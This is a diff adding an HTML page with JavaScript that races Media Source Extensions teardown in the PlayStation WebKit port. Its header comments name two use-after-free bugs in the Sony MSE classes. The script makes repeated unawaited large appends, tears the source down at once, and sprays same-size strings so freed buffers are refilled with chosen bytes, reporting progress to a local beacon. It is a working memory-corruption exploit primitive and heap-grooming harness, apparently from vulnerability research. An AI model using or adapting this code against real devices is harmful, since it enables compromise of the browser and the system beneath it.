@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>msrace</title></head>
+<body><video id="v" muted width="160" height="120"></video><script>
+// Sequencing probes for the Sony MSE classes:
+//  1. SourceBufferPrivatePlayStation::appendInternal hands the SDK a raw pointer
+//     into a Ref<SharedBuffer> that dies on return (async completion) -> UAF read.
+//  2. sourceBufferBackendAppendComplete reads a raw MediaSourcePrivatePlayStation*
+//     on the media thread and calls into the backend that
+//     removedFromMediaSource() resets on the main thread -> UAF race.
+// Each round: fresh MediaSource, big append, then immediate remove/teardown plus
+// a same-size string churn so a freed buffer can be refilled with chosen bytes.
+
+function beacon(tag) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(tag) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+function getBuffer(url) {
+  return new Promise(function(res, rej) {
+    var x = new XMLHttpRequest();
+    x.open('GET', url, true);
+    x.responseType = 'arraybuffer';
+    x.onload = function() { res(new Uint8Array(x.response)); };
+    x.onerror = rej;
+    x.send(null);
+  });
+}
+
+function churn(n, size) {
+  var keep = [];
+  for (var i = 0; i < n; i++) keep.push(new Array(size / 8 | 0).join('A'));
+  keep.push(null);
+  return keep.length;
+}
+
+async function run() {
+  beacon('MR-START');
+  var v = document.getElementById('v');
+  var frag = await getBuffer('/corpus/sample_frag.mp4');
+  beacon('MR-FRAG ' + frag.length);
+
+  var TYPE = 'video/mp4; codecs="avc1.42E01E"';
+  if (!MediaSource.isTypeSupported(TYPE)) {
+    var alt = ['video/mp4; codecs="avc1.4D401E"', 'video/mp4; codecs="avc1.64001E"', 'video/mp4'];
+    for (var a = 0; a < alt.length; a++) {
+      if (MediaSource.isTypeSupported(alt[a])) { TYPE = alt[a]; break; }
+    }
+  }
+  beacon('MR-TYPE ' + TYPE);
+
+  for (var round = 0; round < 40; round++) {
+    var ms = new MediaSource();
+    var url = URL.createObjectURL(ms);
+    v.src = url;
+    var opened = await new Promise(function(res) {
+      var t = setTimeout(function() { res(false); }, 1500);
+      ms.addEventListener('sourceopen', function() { clearTimeout(t); res(true); }, { once: true });
+    });
+    if (!opened) { beacon('MR-NOOPEN r=' + round); continue; }
+
+    var sb = null;
+    try { sb = ms.addSourceBuffer(TYPE); } catch (e) { beacon('MR-NOSB r=' + round); continue; }
+
+    // big append, deliberately not awaited
+    var payload = frag.subarray(0, Math.min(frag.length, 400000 + (round % 3) * 200000));
+    try { sb.appendBuffer(payload.slice(0)); } catch (e) { beacon('MR-APP exc ' + (e && e.name)); }
+    beacon('MR-APP r=' + round + ' n=' + payload.length);
+
+    // immediate teardown while the media thread may still be parsing
+    if (round % 2 === 0) {
+      try { ms.removeSourceBuffer(sb); } catch (e) {}
+    } else {
+      try { ms.endOfStream(); } catch (e) {}
+    }
+    try { v.removeAttribute('src'); v.load(); } catch (e) {}
+    URL.revokeObjectURL(url);
+
+    // refill freed same-size chunks with chosen bytes
+    churn(4 + (round % 4), Math.max(4096, payload.length >> 2));
+
+    if (round % 5 === 0) beacon('MR-ROUND r=' + round + ' alive');
+    await sleep(40);
+  }
+
+  beacon('MR-DONE rounds=40');
+  setTimeout(function() { location.reload(); }, 500);
+}
+
+run().catch(function(e) { beacon('MR-FATAL ' + (e && e.name)); });
+</script></body></html>
